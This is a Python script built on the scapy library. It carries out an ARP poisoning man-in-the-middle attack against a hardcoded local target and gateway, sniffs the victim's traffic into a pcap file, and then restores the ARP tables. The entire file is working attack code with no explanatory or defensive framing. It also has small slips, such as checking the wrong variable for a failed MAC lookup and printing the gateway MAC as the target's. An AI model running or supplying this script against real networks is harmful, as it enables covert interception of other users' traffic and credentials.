from scapy.all import *
import os
import sys
import threading
import signal

interface = "wlp4s0"
target_ip = "192.168.2.103"
gateway_ip = "192.168.2.1"
packet_count = 1000

# set up interface
conf.iface = interface

# close verbose
conf.verb = 0

print("Setting up {}".format(interface))

def get_mac(ip_addr):
    response, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_addr), timeout=2, retry=10)

    for s, r in response:
        return r[Ether].src
    return None

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    
    # using send to restore
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)

    os.kill(os.getpid(), signal.SIGINT)


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("Beginning the ARP poison. [Ctrl+C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)

        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("ARP poison attack finish.")
    return 

gateway_mac = get_mac(gateway_ip)

if gateway_ip is None:
    print("Fail to get gateway  MAC")
    sys.exit(0)
else:
    print("Gateway mac: {}".format(gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("Fail to get target MAC")
    sys.exit(0)
else:
    print("tartget mac: {}".format(gateway_mac))


# start pollution thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("Sniffer within {} packets".format(packet_count))

    port_filter = "ip host {}".format(target_ip)
    packets = sniff(count=packet_count, filter=port_filter, iface=interface)

    # record
    wrpcap('arper.pcap',  packets)

    # restore
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
